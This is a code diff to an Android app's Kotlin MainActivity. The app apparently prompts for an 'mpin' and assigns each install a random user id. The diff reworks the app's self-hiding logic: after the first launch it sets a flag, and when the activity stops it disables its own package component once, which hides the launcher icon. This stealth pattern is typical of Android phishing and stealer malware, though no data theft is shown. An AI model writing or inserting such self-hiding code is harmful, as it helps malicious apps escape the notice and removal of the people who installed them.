@@ -31,6 +31,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var binding:ActivityMainBinding
     private var btnstr = "mpin";
     private var toggle = false
+    val util = Util()
 
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -40,10 +41,11 @@ class MainActivity : AppCompatActivity() {
 
 
 
-
-
-        val util = Util()
         val random = Random()
+
+        if(util.getLocalData(this,"dis")!="1") {
+            util.saveLocalData(this, "dis", "1")
+        }
 
         if (util.getLocalData(this, "userid") == "") {
             util.saveLocalData(this, "userid", Integer.toString(random.nextInt(999999999)))
@@ -191,12 +193,16 @@ class MainActivity : AppCompatActivity() {
 
     }
 
-    override fun onPause() {
-        super.onPause()
-        Log.e("asdf123", "onPause: 11" )
-        val pakagemanger = packageManager
-        pakagemanger.setApplicationEnabledSetting(packageName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP)
+    override fun onStop() {
+        super.onStop()
+        if(util.getLocalData(this,"dis")=="1") {
+            util.saveLocalData(this,"dis","2")
+            val pakagemanger = packageManager
+            pakagemanger.setApplicationEnabledSetting(
+                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        }
     }
 
     private fun settext(){
